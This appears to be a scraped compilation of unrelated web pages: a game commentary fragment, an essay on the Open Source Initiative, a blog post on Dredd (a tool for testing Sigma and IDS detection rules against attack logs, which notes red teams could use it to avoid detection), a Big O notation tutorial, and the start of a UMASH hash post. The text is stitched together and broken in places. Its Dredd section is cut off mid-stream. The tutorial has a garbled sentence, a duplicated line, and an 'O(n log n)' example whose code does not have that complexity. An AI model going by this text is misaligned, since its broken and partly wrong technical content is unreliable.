<p>(Perhaps we can get into this another time, but I’d be remiss in not mentioning another masterpiece that for me really excels about being about things that retain their essence, whilst also really, really allowing me to do magic with them — Jason Robert’s <a href="http://gorogoa.com/" target="_blank" rel="noopener noreferrer">Gorogoa</a>. As with<em> Space Under the Window,</em> <em>Gorogoa</em> is a ‘simple’ interface and game mechanic that becomes deeply affecting and <em>rich</em> by allowing the content, the objects contained therein to retain their inherent richness. An apple in <em>Gorogoa</em> is not just a 1 or a 0, it’s an <strong>apple</strong>. It also helps there that it’s an apple lovingly drawn and animated by Roberts — with <span><a href="https://store.steampowered.com/app/1350200/Project_A/" target="_blank" rel="noreferrer noopener">Project A███████</a> </span>is we will once again be in the world of a filmed game and so our objects will have the luxury of being photographed real objects — things retaining their thingness, conceptually and gorgeously aesthetically.)</p>

<p>Recently, E Hashman of the OSI board <a href="https://twitter.com/ehashdn/status/1276712953362870280">asked for feedback</a> from communities that traditionally don’t have ties with the Open Source Initiative, particularly the JS, Ruby and Rust communities. As I was heavily involved in the latter two, I decided to answer, received a questionnaire and answered it. It was a very pleasing exchange, thank you!</p>
<p>I don’t want to repeat the questionnaire or my answers here, but the central question “What’s stopping you from becoming a member of the OSI?” stuck with me and I want to write down my personal (biased, incomplete) view of the OSI and particularly why I never spend a passing thought on it, unless inquired.</p>
<h2 id="my-view-on-the-js-ruby-and-rust-communities-python">My view on the JS, Ruby and Rust communities (+Python)</h2>
<p>I’m biased here, but I believe that the JavaScript, Ruby and Python communities were responsible for the dominant cultural shift in programming from 2010 on. I would even go as far as saying that Rust isn’t even particularly innovative, but applied practices from those communities well. These communities were effective at building new structures, bringing coding to the masses and thinking new ways. The Ruby Community invented the (Rails)Bridges and Rails Girls and a very distributed network of small conferences and non-profits, such as Ruby Central, Ruby Berlin and RubyTogether. The Python community built a highly effective foundation and the PyCons, which are still a reference model for e.g.&nbsp;effective abuse handling and public documentation of procedures. The JavaScript community has shown an extremely good hand at scaling wide and broad, showing community prowess and being very nimble at addressing technical problems.</p>
<p>Together, they have understood that the way to scale your communities is bringing new people in and understood using the hypergrowth of the tech sectors in their years to their success. Although Ruby ends the clear third after a decade, Ruby would be irrelevant nowadays without those approaches.</p>
<p>In summary, I would say that these 3 communities aggressively pushed the needle of what’s practice in open source. Especially in my local area, in Berlin, this can be seen through the success of non-profits like OpenTechSchool, which is technology-independent, but driven by members of those 3 communities.</p>
<p>I am along for that ride - first RailsConf Europe attendance in 2008, first organisational work in 2010, with germany.rb, the German Ruby meetup, then eurucamp in 2012, the Rust Meetup under OTS since 2014 and RustFest since 2016. I started contributing to the Padrino webframework in 2011, and to Rust in 2014. Present tense, because this is a great ride.</p>
<h2 id="open-source-but-not-osi">Open Source, but not OSI</h2>
<p>All of these environments can easily be called “Open Source”. For example, Ruby on Rails was a driver for the popularisation of the MIT license as the default license in the Ruby world, despite Ruby’s inventor, Yukihiro Matsumoto, being a recognised <a href="https://en.wikipedia.org/wiki/Yukihiro_Matsumoto#Recognition">free software advocate</a>. Yet, their detachment from the OSI is a curious matter. One would imagine that the sudden success of not one, but three ecosystems would make the <em>stewards of open source</em> interested! No such thing happened. I can only speculate on reasons from the OSI side, but I <em>can</em> give my personal reasons for the other way around.</p>
<p>The last decade or so has seen a huge uptake in both open source productivity and in creation of new community structures. Especially, it saw the formation of structures <em>beyond code</em> and <em>beyond the old ones</em>. To give an example here: <a href="https://opentechschool.org/">OpenTechSchool (OTS)</a> was created to teach people coding - more than 10000 people have used that offer in over 1000 events in the first 5 years since its inception. And this is just the tip of the iceberg of a new meetup and conference culture in FOSS. The groups organising OTS events are a new generation of community and project organisers, who have a mission that goes beyond making code free: actually democratizing coding by destroying barriers and giving marginalised people a spot in an environment that <em>should</em> be accessible, but <em>isn’t</em>. Those structures have an interesting property: a desire for independence.</p>
<p>But the software side also started to struggle: a lot more software started popping up and the production of open source software has accellerated extremely. And facing the high additional amount of labor necessary to deal with a much bigger community and much bigger competition, the same issue popped up: independence.</p>
<p>In both of these contexts, independence is often discussed as a money issue, usually in two variants. The raw one: how do I even get money for my work? And the hidden one: If I receive large amounts of money, e.g.&nbsp;by being employed, how does my project stay independent?</p>
<p>There’s again three ways out of this:</p>
<p>The first: Ruby on Rails has indeed answered the question by stepping off and just not taking money, finding other ways of getting their infrastructure cost paid. This still means that Rails production costs money and someone foots the bill, but it’s essentially a big barter deal. This leads to a number of weird issues, like the actual cost of a project not being calculatable and funds not being shiftable. Cost-savings don’t work to your benefit, but the donors.</p>
<p>The second is blunt: just not play the game anymore. I remember a quote from <a href="https://twitter.com/alicetragedy/">alicetragedy</a> at a conference where I inquired how a project was doing: “It’s successful, so I may have to shut it down”. Retract your labour.</p>
<p>The third is also rather upfront: build a funding structure, which means <em>additional labour overhead</em>, especially around distributing funds and paying the people distributing the funds. Also, tons of conversations with potential sponsors.</p>
<p>You may look for the fourth, “getting people employed”, but that doesn’t give you independence, as those people are clearly bound to their employer’s direction. This is not a theoretical case, FOSS developers getting hired into companies and at some point moving up the career ladder is a cause of maintainer drain.</p>
<h2 id="now-what-about-the-osi">Now, what about the OSI?</h2>
<p>But this article is about the OSI, or, rather, about the absence of the OSI. And I think that is the crux of the issue: this transformation has happened without the proclaimed stewards of the Open Source Definition. And this isn’t unsurprising, because OSIs focus is different: OSI is about promoting Open Source in the industry.</p>
<p>This does, for example, show in their <a href="https://opensource.org/osi-open-source-education">education material</a>, which (except a course for kids) is often aimed at the interaction of businesses with the Open Source world. Only the GitHub material is aimed at non-corporate Open Source maintainers, but obviously biased towards GHs services they provide to the community. The other linked guide by <a href="https://todogroup.org/guides/">TODO Group</a> uses multiple huge entities like Uber or Microsoft as case studies. The third one is <a href="https://opensource.google/docs/">the Google open source documentation</a>, which is mainly aimed at Googlers. My general conclusion is that individual maintainers are not the main target group of the OSI, especially not in practice teaching.</p>
<p>They do provide useful resources to maintainers, like the OSI license list and the license discussion mailing list, but these are only a fragment of the issues we are facing today.</p>
<p>Case studies, investigations and similar around popular, indepent Open Source projects are suspisciusly missing. The only writing I could find that does touch on the issues I mentioned above is <a href="https://opensource.org/node/1009">this one</a>, which pretty much argues the status quo.</p>
<h2 id="why-i-never-think-about-the-osi">Why I never think about the OSI</h2>
<p>And this is the reason why I never think about the OSI, except when I want to check whether a license is considered open source. Because it has, by itself, been very absent. Beyond the utility value of defining what “Open Source” is<a href="https://yakshav.es/non-thoughts-on-the-osi/There's%20the%20debate%20on%20that%20fundamentally%20attacks%20whether%20it's%20the%20OSI%20is%20right%20to%20do%20so,%20but%20I'm%20okay%20here.">1</a>, OSI is not helpful to me.</p>
<p>It didn’t pick up interesting threads and didn’t try to get in touch with communities that didn’t naturally gravitate towards them. One of their <a href="https://en.wikipedia.org/wiki/Eric_S._Raymond#Political_beliefs_and_activism">co-founders being extremely aggressive</a> towards progressive causes, which were an underlying thread of many of the changes mentioned above, did add some negative feelings in the mix. I say <em>some</em> because I appreciate that ESR is not the OSI and many of the current OSI leadership don’t hold his views, but this hampered the organisation on growing a new community.</p>
<p>But my main issue with the OSI is how little <em>positive</em> and <em>forward-thinking</em> I get out of it. Studies on Open Source issues like <a href="https://www.fordfoundation.org/media/2976/roads-and-bridges-the-unseen-labor-behind-our-digital-infrastructure.pdf">Roads and Bridges</a> (and its follow-up book <a href="https://www.amazon.com/Working-Public-Making-Maintenance-Software/dp/0578675862">Working in Public</a>), or things like the <a href="https://res.cloudinary.com/maintainerati/image/upload/v1585300565/Berlin%202019/Berlin_2019_Event_Report_rpcxtg.pdf">Maintainerati Report</a> would have been home-runs for the OSI to produce or at least promote. Mozilla’s <a href="https://mozilla.github.io/open-leadership-training-series/">Open Leadership Resources</a> and trainings are also to be mentioned. All of these are much more useful to me as a maintainer and project lead striving for independence than anything the OSI produces. Their <a href="https://opensource.org/board">leadership</a> is also mainly consisting of people employed at a number of companies, shielding them from the issues mentioned above.</p>
<h2 id="but-why-am-i-writing-about-it-then">But why am I writing about it, then?</h2>
<p>I find OSI’s current public behaviour disconcerting. Or, rather, the absence of public behaviour, replaced by vocal chair-people. All the issues mentioned above have increased, even culminating in the current drift of “ethical source”, which adds an additional layer of morality on top. It’s a subject for another post, I do actually believe this issue would be less hot if the previous ones were addressed earlier.</p>
<p>The Ethical Source and Open Code (payment involved) movements is a direct attack on the values of the OSI (and, incidentally, the FSF), from a direction that I believe those organisations did not see it coming: from maintainers and developers. I believe that this is the first fundamental value shift on that front since the Open Source movement split from the Free Software Movement. This puts especially the OSI on the defense. And this defense is weakened, as they have missed building ties to major community drifts. The inability to see and address those drifts and reorient towards maintainer issues has left the OSI out in the open.</p>
<p>This is sad, because the OSI <em>is</em> uniquely positioned to guide these discussions: it is an old …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Offensive security moves at a breakneck pace and keeping up with new tools and TTPs (tactics, techniques, and procedures) can be an undertaking of its own for a security team. Creating, testing, and managing the detection rules for those changes is even more so a challenge, especially at scale. To address this challenge of quickly testing detection rules, we developed the tool Dredd. Dredd automates both the analysis of Sigma<a href="https://github.com/Neo23x0/sigma" target="_blank" rel="noopener noreferrer"><sup>[1]</sup></a> rules against Mordor<a href="https://github.com/Neo23x0/sigma" target="_blank" rel="noopener noreferrer"><sup>[2]</sup></a> datasets (collections of logs of attacker procedures), and the analysis of IDS rules against PCAPs. In this blog, we will discuss Dredd and its potential uses.</p><h2>Siem Rules Analysis</h2><p>Much like its namesake – Judge Dredd – Dredd is judge, jury, and executioner. Dredd handles the log ingestion and normalization, detection rule conversion, and detection rule evaluation. For the detection rule side of Dredd, Sigma was chosen. Sigma is a SIEM agnostic rule format that is designed to be interoperable. The Sigma project provides a utility (sigmac) and library (sigmatools)<a href="https://github.com/Neo23x0/sigma/tree/master/tools" target="_blank" rel="noopener noreferrer"><sup>[3]</sup></a> to translate their format to other platforms like Splunk, QRadar, and Elastic.</p><p><img data-attachment-id="231652" data-permalink="https://sra.io/blog/automated-detection-rule-analysis-with-dredd/dredd-image-1/" data-orig-file="https://i1.wp.com/sra.io/wp-content/uploads/2020/08/Dredd-image-1.png?fit=1770%2C626&amp;ssl=1" data-orig-size="1770,626" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Dredd image 1" data-image-description="" data-medium-file="https://i1.wp.com/sra.io/wp-content/uploads/2020/08/Dredd-image-1.png?fit=300%2C106&amp;ssl=1" data-large-file="https://i1.wp.com/sra.io/wp-content/uploads/2020/08/Dredd-image-1.png?fit=1024%2C362&amp;ssl=1" loading="lazy" src="https://sra.io/wp-content/uploads/2020/08/Dredd-image-1.png" alt="" width="1770" height="626" srcset="https://sra.io/wp-content/uploads/2020/08/Dredd-image-1.png 1770w, https://sra.io/wp-content/uploads/2020/08/Dredd-image-1-1280x453.png 1280w, https://sra.io/wp-content/uploads/2020/08/Dredd-image-1-980x347.png 980w, https://sra.io/wp-content/uploads/2020/08/Dredd-image-1-480x170.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1770px, 100vw"></p><p><em>Converting a Sigma rule<a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_user_creation.yml" target="_blank" rel="noopener noreferrer"><sup>[4]</sup></a> (left) to a Splunk query (right) using sigmac</em></p><p>The other major component of Dredd is Mordor.

<em>Using Dredd to evaluate merged logs</em></p><p><em>(Note: all videos are sped-up)</em></p><p>A Sigma rule that uses Sysmon logs to look for “schtasks.exe” gets a hit against the two Mordor log sets. In this example, the two Mordor logs are merged and the rules are run against the merged logs. However, this same procedure can be performed without merging the logs:</p><p><br>
<em>Using Dredd to evaluate unmerged logs</em></p><p>Here you can see that the “schtasks.exe” rule had a hit against the scheduled task log set but not the DCSync log set.</p><h3>Other Data Sources</h3><p>Dredd currently only supports Mordor datasets for Sigma analysis. The Mordor project lays out different environments where the logs were captured so that analysts can lookup which hosts map to which purpose (ex: IP 172.18.39.8 is the attacker C2 in the Shire<a href="https://mordordatasets.com/mordor_shire.html" target="_blank" rel="noopener noreferrer"><sup>[7] </sup></a>environment). Dredd however does not enforce conformity those Mordor environments or require additional metadata (like the attacker view). In practice, Dredd will support any JSON logs produced by Winlogbeat or logs matching that schema<a href="https://www.elastic.co/guide/en/beats/winlogbeat/current/exported-fields.html" target="_blank" rel="noopener noreferrer"><sup>[8]</sup></a>. This means that support for projects like EVTX-ATTACK-SAMPLES<a href="https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/" target="_blank" rel="noopener noreferrer"><sup>[9]</sup></a>, a project similar to Mordor but using evtx files (Windows Event Log files), can be added fairly easily.</p><p><a href="https://gist.github.com/2XXE-SRA/548f856f2161341a6c405944db91d645" target="_blank" rel="noopener noreferrer">Here</a><a href="https://gist.github.com/2XXE-SRA/548f856f2161341a6c405944db91d645" target="_blank" rel="noopener noreferrer"><sup>[</sup><sup>10]</sup></a> is a PowerShell script to convert evtx files to Winlogbeat JSON files using Winlogbeat. Once converted and archived as tar.gz files, they can be used alongside Mordor log sets.</p><p><img data-attachment-id="231654"

href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_mmc20_lateral_movement.yml" target="_blank" rel="noopener noreferrer"><sup>[12]</sup></a> using Dredd<br>
</em><i>The MMC lateral movement rule worked against the export</i></p><h2>IDS Rule Analysis</h2><p>Dredd also supports the evaluation of Snort/Suricata IDS rules against PCAPs using Suricata. Unlike with Elasticsearch however, Dredd can simply mount the rules and PCAPs into a container as-is and use Suricata to perform offline analysis. There are several good sources for attacker PCAPs, including the Mordor project, which has PCAPs for the APT29 emulation plan by MITRE<a href="https://attackevals.mitre.org/APT29/" target="_blank" rel="noopener noreferrer"><sup>[13]</sup></a>, PCAP-ATTACK<a href="https://github.com/sbousseaden/PCAP-ATTACK" target="_blank" rel="noopener noreferrer"><sup>[14]</sup></a>,<em> which is by the same author as the EVTX-ATTACK-SAMPLES, and</em> PacketTotal<a href="https://packettotal.com/" target="_blank" rel="noopener noreferrer"><sup>[15]</sup></a>,<em> a VirusTotal like website for packet captures.</em></p><p>When analyzing these captures with Dredd, it will merge all rules together then evaluate them against each PCAP individually. However, there is also the option to evaluate the rules against all PCAPs at once.<em><br>
</em></p><p><br>
<em>Using Dredd to evaluate unmerged PCAPs</em></p><h2>Applications</h2><p>The most obvious use case for Dredd is as a tool to help detection content developers analyze new and existing detections against attacker activities. Upon release, an analyst can download a log export of the tool or procedure, load it into Dredd with their existing detection rules, then determine if they have coverage for it. If they lack coverage, they can build a new detection and use Dredd to validate that the rule works as expected. In this same scenario, Dredd can be used to test the rule’s propensity to false positives by evaluating the rule against benign sets of logs.<br>
Dredd can also help in situations where an analyst may not have access to a detection platform (SIEM/IDS) or the platform is more tightly controlled. Analysts on the go or working off hours may not have the ability to run arbitrary queries against the platform. In other situations, query access to the platform could be restricted for reasons such as limiting performance degradation of scheduled queries and licensing. Dredd can help in either case by acting as a proxy for the platform when evaluating detection content.<br>
If the detection team(s) version controls their detection logic, Dredd can be used as part of a continuous integration/continuous deployment (CI/CD) pipeline to automate rule validation. Once new rules or changes to existing rules are committed to the source control management system (e.g. GitHub, Bitbucket), an automated process can be initiated to evaluate the rules against various logs. To that end Dredd has support for using non-zero exit codes (in addition to the normal structured results) when rules do not have any results, thereby causing a build failure.</p><p><br>
<em>Changing the exit code behavior</em></p><p>This type of continuous testing is more commonly found in traditional software development practices but is just as applicable – and useful – in testing security detection content.<br>
Red team operators can also make use of Dredd. The operator first generates the log data by practicing with their different tools and TTPs within a testing environment set to log the appropriate sources. Then the operator evaluates those logs either against their organization’s existing detection rules or against publicly available detection rules. Using the results, they can identify areas of their methodology that are likely to be detected and either avoid them or innovate on them. The red team operator will also get a better understanding of what characteristics are common in detection logic so they can avoid those where possible when developing their methodologies.</p><h2>Dredd</h2><p>Dredd can be found on the Security Risk Advisors GitHub page here: <a href="https://github.com/SecurityRiskAdvisors/dredd" target="_blank" rel="noopener noreferrer">https://github.com/SecurityRiskAdvisors/dredd</a>.

<!-- Horizontal Top Article -->
<p>The Big O notation is a notion often completely ignored by developers. It is however a fundamental notion, more than useful and simple to understand. Contrary to popular belief, you don’t need to be a math nerd to master it. I bet you that in 7 minutes, you’ll understand everything.</p>



<h3>What is the Big O notation ?</h3>



<p>The Big O notation (or algorithm complexity) is a standard way to measure the performance of an algorithm.<strong> It is a mathematical way of judging the effectiveness of your code.</strong> I said the word mathematics and scared everyone away. Again, you don’t need to have a passion for math to understand and use this notation.</p>



<p>This notation will allow you to measure the growth rate of your algorithm in relation to the input data.<strong> It will describe the worst possible case for the performance of your code.</strong> Today, we are not going to talk about <a href="https://en.wikipedia.org/wiki/Space_complexity" target="_blank" rel="noreferrer noopener">space complexity</a>, but only about time complexity.</p>



<p>And it’s not about putting a timer before and after a function to see how long it takes.</p>



<figure><img src="https://i.imgur.com/NOOASFD.jpg" data-src="https://i.imgur.com/NOOASFD.jpg" alt="big o notation"></figure>



<p>The problem is that the timer technique is anything but reliable and accurate. With a simple timer the performance of your algo will change greatly depending on many factors.</p>



<ul><li>Your machine and processors</li><li>The language you use</li><li>The load on your machine when you run your test</li></ul>



<p><strong>The Big O notation solves all these problems and allows us to have a reliable measure of the efficiency of all the code you produce.</strong> The Big O is a little name for “order of magnitude”.</p>



<p>And that’s really the important thing to understand. You don’t directly measure the speed of an algorithm in seconds. <strong>You measure the growth rate of an algorithm by the number of operations it takes to complete.</strong> You should Big O notation when performance among developers.</p>



<figure><img src="https://i.imgur.com/Aaml29y.jpg" data-src="https://i.imgur.com/Aaml29y.jpg" alt="developers"></figure>



<p>Not convinced ? OK, let’s put ourselves in a real life situation!</p>



<h3>It could happen to you</h3>



<p>Imagine, you’re hard at work, and one day you’re asked to make a function that will return the sum of all the numbers from 1 to the number passed as a parameter. More clearly, something that would have this behavior.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">n = 3

output = getSum(n)

print(output)
# will print : 6  because 1 + 2 + 3 = 6</pre>



<p>Immediately, the first thing that comes to your mind is to make a simple loop that will cumulate the numbers one by one. <strong>I’ll give you examples in Python, but we don’t give a fuck about language.</strong> It applies to any language.</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def getSum(n):
    sum = 0

    for number in range(1, n + 1):
        sum += number

    return sum</pre>



<p>And it works. You start your function with input 3: instantly you have the right result. Great! You’re pushing to prod and you’re getting a coffee in a nonchalant way.</p>



<p>A few days later, someone contact you directly and tell you that the system has become super slow. It’s because of your function. <strong>The process time of your function goes up to more than 15 seconds!</strong> It frequently blocks the whole system for several seconds.</p>



<figure><img src="https://i.imgur.com/K7bnC9x.jpg" data-src="https://i.imgur.com/K7bnC9x.jpg" alt="big o notation"></figure>



<p>Panic! You look at the logs and you realize that the input has become huge numbers. Sometimes, the input of your function goes up to 1 billion. <strong>Another developer had to intervene.</strong> Your function is replaced and everything goes back to normal. You look at the new code and you see that.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def getSum(n):
    return n * (n + 1) / 2</pre>



<p>This function solves the problem instantly, even when the input is 1000 billion. You ask the developer who did that on Slack and his answer gets you even more lost.</p>



<p><em>“Hi! Your solution had a linear O(n) trend except that the input was huge. I found a constant solution O(1). No matter how high the input is, it will be fast now.”</em></p>



<p>You look at your screen and you have a single question that obsesses you.</p>



<h3>How does it work?</h3>



<p>As I told you, the key is to evaluate how many operations the machine will need to do to solve your problem. With your solution, there are a lot of operations.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def getSum(n):
    sum = 0  &lt;-- assignment

    for number in range(1, n + 1): &lt;-- addition + range
        sum += number &lt;-- n additions + n assignments

    return sum</pre>



<p>We're not going to do the exact calculation of the number of operations because we don't care about the exact number. <strong>We want the trend of the number of necessary operations according to the input parameters</strong>. What should shock now is the loop at line 4 and 5.</p>



<p>The operations to solve your problem will be multiplied by the size of your input. Your order of magnitude is directly related to the number n at the input of your function. <strong>Your function therefore has a linear trend of O(n).</strong></p>



<p>The input is 1 billion ? It will be 1,000,000,000 * operations to do for the machine.</p>



<figure><img src="https://i.imgur.com/SYmm6Lh.jpg" data-src="https://i.imgur.com/SYmm6Lh.jpg" alt="time"></figure>



<p>This is not the case for the other function.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def getSum(n):
    return n * (n + 1) / 2 &lt;-- trois opérations</pre>



<p>With this solution, the operations to solve your problem will not increase along with your input. Your order of magnitude will always be three operations, regardless of the input. <strong>Your function therefore has a constant trend of O(3), which is simplified to O(1)</strong>. If you draw a picture, it looks like this.</p>



<div><figure><img src="https://i.imgur.com/DpSLIzO.jpg" data-src="https://i.imgur.com/DpSLIzO.jpg" alt="big o notation"></figure></div>



<p>You beginning to understand why it's important to have this notion in mind. There are obviously other scenarios for this notation. Let's take a quick look.</p>



<h3>Big O notation by example</h3>



<h4>Constant complexity O(1)</h4>



<p>The constant complexity <strong>O(1)</strong> does not change regardless of the input. The same number of operations is required everytime.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def exempleO1(n):
    print(n + n)</pre>



<h4>Logarithmic complexity <strong>O(log(n))</strong></h4>



<p>The log complexity <strong>O(log(n))</strong> is more tricky to understand if you don't have <a href="http://www.mclph.umn.edu/mathrefresh/logs.html" target="_blank" rel="noreferrer noopener">the notion of logarithm in math</a>. In a greatly simplified way, a logarithmic tendency is the opposite of an exponential tendency. Where an exponential trend will multiply over time, and the performance of your algo with it, the logarithmic trend will divide.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def exempleOlogn(n):
    i = 1

    while(i &lt; n):
        i = i * 2
        print(i)</pre>



<p>The <a href="https://en.wikipedia.org/wiki/Binary_search_algorithm" target="_blank" rel="noreferrer noopener">binary search</a> algorithm works with this trend.</p>



<h4>Linear complexity O(n)</h4>



<p>The linear complexity <strong>O(n)</strong> evolves in direct relation with the size of the input. The number of operations grows with the number of input. The simplest example is a simple loop.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def exempleOn(n):
    for number in range(n):
            print(number + 1)</pre>



<h4>Linearithmic complexity <strong>O(n log(n))</strong></h4>



<p>Linear complexity <strong>O(n log(n))</strong> uses the same "divide and conquer" approach as logarithmic complexity except that it does so on each element of input n.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def exempleOlogn(n):
    i = 1
    for number in range(n):
        while(i &lt; n):
            i = i * 2
            print(i)</pre>



<p>The merge sort algorithm works with this trend.</p>



<p>The <a href="https://en.wikipedia.org/wiki/Merge_sort" target="_blank" rel="noreferrer noopener">merge sort</a> algorithm works with this trend.</p>



<h4>Quadratic complexity O(n²)</h4>



<p>The quadratic complexity <strong>O(n²)</strong> will evolve to the square of the input. The number of operations will grow to the square of the input. Two nested loops is the perfect example for this trend.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def exempleOn2(n):
    for number in range(n):
        for number in range(n):
            print(number + 1)</pre>



<p>The best-known sorting algorithms (<a href="https://en.wikipedia.org/wiki/Quicksort" target="_blank" rel="noreferrer noopener">quick sort</a>, <a href="https://en.wikipedia.org/wiki/Bubble_sort" target="_blank" rel="noreferrer noopener">bubble sort</a>, <a href="https://en.wikipedia.org/wiki/Insertion_sort" target="_blank" rel="noreferrer noopener">insertion sort</a>) have this tendency.</p>



<p>There are plenty of others that I'm not telling you about. If you want to see them all, <a href="https://en.wikipedia.org/wiki/Analysis_of_algorithms" target="_blank" rel="noreferrer noopener">the wiki page</a> is interesting.</p>



<figure><img src="https://i.imgur.com/yOEbMzp.jpg" data-src="https://i.imgur.com/yOEbMzp.jpg" alt="big o notation"></figure>



<p><strong>Also, look at <a href="https://www.youtube.com/watch?v=v4cd1O4zkGw" target="_blank" rel="noreferrer noopener">this short YouTube video</a> which is EXCELLENT to understand the rules of simplifying the writing of the notation.</strong> For example why is O(3) simplified into O(1)? Why do two loops that are not nested stay in a complexity O(n) ? Like any subject in your profession, there is an ocean of knowledge.</p>



<figure><img src="https://i.redd.it/gevxp9dvk7b11.jpg" data-src="https://i.redd.it/gevxp9dvk7b11.jpg" alt="ocean"></figure>



<p>Finally, we will discuss why all this is important.</p>



<h3>Why is this important?</h3>



<p>I see developers working with small volumes coming in, convinced that all this will be of no use to them. Or even developers with 300 years of experience who don't need all this stuff.</p>



<p>The Big O notation quickly answers a question that every developer should ask himself during his work. <strong>How much does my solution scale?</strong> And it doesn't matter if your volumes are huge or not. It's important that you understand the limits of your solutions in order to estimate the limits of your system.</p>



<p>Then, by understanding this notion, <strong>you will have a standard language to discuss with other developers</strong>. This is important for comparing solutions, making trade-offs and simply exchanging technical information. </p>



<p>If you don't understand what we're talking about, you have a handicap. Personally, this even happened to me in interviews at the beginning of my career. I had no idea what he was talking about and I was in panic mode.</p>



<figure><img src="https://i.ytimg.com/vi/a3lcGnMhvsA/maxresdefault.jpg" data-src="https://i.ytimg.com/vi/a3lcGnMhvsA/maxresdefault.jpg" alt="big o notation"></figure>



<p>Having this basic understanding changed the way I approached problems.  And as a developer, it's important to make optimized code.</p>



<p>Last but not least, these notions will allow you to quickly spot what is wrong with a slow system. A lot of time is spent reading and repairing other developers' code. <strong>All of this will allow you to find and optimize bits of slow code faster.</strong></p>



<h3>Epilogue</h3>



<p>I hope this introduction to Big O notation made you want to know more. It's important to know this concept in order to better optimized your code. And generally speaking, it will be more and more useful to you as your career evolves.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p>We accidentally a whole hash function… but we had a good reason!
Our
<a href="https://github.com/backtrace-labs/umash">MIT-licensed UMASH hash function</a>
is a decently fast non-cryptographic hash function that guarantees
a worst-case bound on the probability of collision
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">between any two inputs generated independently of the UMASH parameters</a>.</p><p>On the
<a href="https://en.wikichip.org/wiki/intel/xeon_platinum/8175m">2.5 GHz Intel 8175M</a>
servers that power <a href="https://backtrace.io/">Backtrace</a>’s hosted
offering, UMASH computes a 64-bit hash for short cached inputs of up
to 64 bytes in 9-22 ns, and for longer ones at up to 22 GB/s, while
guaranteeing that two distinct inputs of at most \(s\) bytes collide
with probability less than \(\lceil s / 2048 \rceil \cdot 2^{-56}\).
If that’s not good enough, we can also reuse most of the parameters to
compute two independent UMASH values. The resulting 128-bit
<a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint function</a>
offers a short-input latency of 9-26 ns, a peak throughput of 11.2
GB/s, and a collision probability of \(\lceil s / 2048 \rceil^2 \cdot
2^{-112}\) (better than \(2^{-70}\) for input size up to 7.5 GB).
These collision bounds hold for all inputs constructed without any
feedback about the randomly chosen UMASH parameters.</p><p>The latency on short cached inputs (9-22 ns for 64 bits, 9-26 ns for
128) is somewhat worse than the state of the art for non-cryptographic
hashes—
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> achieves
8-15 ns and <a href="http://fastcompression.blogspot.com/2019/03/presenting-xxh3.html">xxh3</a>
8-12 ns—but still in the same ballpark. It also
compares well with latency-optimised hash functions like
<a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function#FNV-1a_hash">FNV-1a</a>
(5-86 ns) and
<a href="https://en.wikipedia.org/wiki/MurmurHash#MurmurHash2">MurmurHash64A</a>
(7-23 ns).</p><p>Similarly, UMASH’s peak throughput (22 GB/s) does not match
the current best hash throughput (37 GB/s with
<a href="https://github.com/Cyan4973/xxHash">xxh3</a>
and <a href="https://github.com/gamozolabs/falkhash">falkhash</a>, apparently
10% higher with <a href="https://github.com/cmuratori/meow_hash">Meow hash</a>),
but does comes within a factor of two; it’s actually higher than that of
some performance-optimised hashes, like
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> (16 GB/s) and
<a href="https://github.com/google/farmhash">farmhash32</a>
(19 GB/s). In fact, even the 128-bit fingerprint (11.2 GB/s) is
comparable to respectable options like
<a href="https://github.com/aappleby/smhasher/blob/master/src/MurmurHash2.cpp#L89">MurmurHash64A</a>
(5.8 GB/s) and
